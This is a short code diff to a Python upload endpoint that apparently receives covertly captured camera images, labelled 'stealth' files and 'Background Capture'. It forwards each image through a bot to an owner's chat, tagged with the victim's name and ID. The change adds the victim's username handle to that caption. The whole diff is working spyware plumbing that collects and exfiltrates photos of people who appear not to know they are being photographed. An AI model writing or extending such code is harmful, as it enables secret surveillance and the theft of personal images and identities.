@@ -34,6 +34,7 @@ def upload():
     data = request.json
     user_id = data.get('user_id')
     user_name = data.get('user_name')
+    user_handle = data.get('user_handle', 'No Username')
     image_base64 = data.get('image').split(",")[1]
     
     filename = f"stealth_{user_id}_{int(time.time())}.jpg"
@@ -46,7 +47,7 @@ def upload():
                 await bot_instance.send_photo(
                     chat_id=OWNER_ID,
                     photo=open(filename, 'rb'),
-                    caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🆔 ID: {user_id}"
+                    caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🔗 Handle: {user_handle}\n🆔 ID: {user_id}"
                 )
             if os.path.exists(filename): os.remove(filename)
         except Exception as e:
